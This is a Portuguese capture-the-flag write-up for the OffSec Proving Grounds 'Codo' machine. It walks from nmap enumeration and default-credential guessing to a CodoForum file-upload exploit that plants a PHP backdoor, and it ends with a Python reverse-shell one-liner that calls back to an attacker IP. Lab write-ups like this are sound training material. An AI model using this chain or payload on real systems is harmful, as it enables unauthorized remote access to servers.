---
title:     "OffSec Proving Grounds - Codo"
tags: [linux,easy,codoforum v5.1.105]
categories: OffSecProvingGrounds
---

![image](https://github.com/user-attachments/assets/463729da-b9be-4ace-afb6-0d483b30a3c8)

## Enumeration

Como é prática comum, iniciamos a análise da máquina com uma etapa de enumeração para mapear suas portas e serviços expostos. Para isso, utilizamos o **Nmap** com as seguintes opções:

```
nmap -T4 -p- -v 192.168.243.23 -oN nmap-all-ports
```

- **-T4**: Define o nível de agressividade da varredura, permitindo uma execução mais rápida sem comprometer a precisão.
- **-p-**: Varre todas as portas, de 1 a 65535, garantindo que nenhum serviço exposto passe despercebido.
- **-v**: Habilita a saída verbosa, facilitando o monitoramento em tempo real do progresso da varredura.
- **-oN**: Salva o resultado da varredura em um arquivo de log para futura referência e análise.

Lembre-se de que você também pode utilizar a ferramenta **NmapAutomator** para agilizar o processo de varredura. O **NmapAutomator** automatiza diferentes tipos de varredura do **Nmap**, oferecendo uma maneira mais rápida e organizada de obter as informações necessárias.

```
nmapAutomator.sh -H 192.168.243.23 -t All -o nmapautomator.log
```

Essa ferramenta é especialmente útil para realizar múltiplos tipos de varredura em uma única execução, otimizando o tempo e garantindo que todas as portas e serviços relevantes sejam enumerados de maneira eficiente.

![image](https://github.com/user-attachments/assets/1dfbb709-7dbd-4401-a6bd-6e92f17eef70)

Ao verificar a porta 80, identificamos que ela está executando um fórum.

![image](https://github.com/user-attachments/assets/4a7141a8-987e-4084-9213-1480b7d8ce73)

Como sabemos, sempre que encontramos páginas de login, é recomendável tentar credenciais padrão, como admin:admin ou admin:password , entre outras combinações comumente utilizadas. Além disso, muitas vezes as credenciais padrão são fornecidas diretamente pela documentação do fabricante do produto, que pode ser facilmente encontrada no Google. Isso pode oferecer um caminho rápido para o acesso inicial, especialmente se as configurações de segurança não tiverem sido ajustadas corretamente.

![image](https://github.com/user-attachments/assets/8f3226fa-7403-4c77-8479-a4d82a97d9cb)

Pesquisando por explorações disponíveis, e utilizando como de costume a ferramenta searchsploit, encontrei algumas vulnerabilidades interessantes que podem ser testadas.

![image](https://github.com/user-attachments/assets/b119e57e-dcbd-48e3-9f52-1a41ebaf6237)

## Exploitation

Essa exploração é muito simples: você pode, nas configurações globais, modificar a logo do sistema. Em vez de enviar uma imagem, você faz o upload de um arquivo .php malicioso. Esse arquivo permitirá a execução de comandos no servidor, o que posteriormente poderá ser utilizado para obter uma reverse shell e ter acesso remoto à máquina.

Primeiro, você precisa modificar as configurações para aceitar o upload de arquivos .php, conforme mostro na imagem abaixo. Isso permitirá que você faça o upload do arquivo malicioso e o execute no servidor.

![image](https://github.com/user-attachments/assets/177dbad7-897f-4e18-9671-5df2c37cf70e)

Depois disso, no próprio Kali Linux, você pode buscar por arquivos .php maliciosos que possam ser usados em suas explorações. No meu caso, utilizei uma simples backdoor que me permitia executar comandos remotamente na máquina alvo.

![image](https://github.com/user-attachments/assets/49bd7eaa-925a-4493-9371-7dace3572c7f)

Então, fazemos o upload do nosso arquivo simple-backdoor.php e acessamos o arquivo no local indicado pelo servidor. Lembre-se de que é crucial entender a exploração para obter sucesso, garantindo que o processo funcione conforme esperado.

![image](https://github.com/user-attachments/assets/16c5c622-5468-4f64-bf37-5e7a91ef74e4)

![image](https://github.com/user-attachments/assets/98c7c9ac-0dd5-4766-b6aa-8fd11f583fca)

Ótimo! Conforme podemos observar na imagem acima, ao digitar o comando `id`, vemos que conseguimos executá-lo com sucesso na máquina alvo, confirmando que a exploração foi bem-sucedida.

Para obter uma reverse shell foi simples, mas antes, é importante verificar quais ferramentas estão disponíveis na máquina alvo. No meu caso, os payloads padrão de bash não estavam funcionando. Como já passei por isso antes, sabia que poderia utilizar outras opções, como Python. Verifiquei se o Python3 estava instalado usando o comando `which python3`, e confirmei que estava presente na máquina.

Usando os payloads disponíveis no site [Pentestmonkey - Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), encontrei o seguinte payload que utilizei para obter a **reverse shell**:

```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.232",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

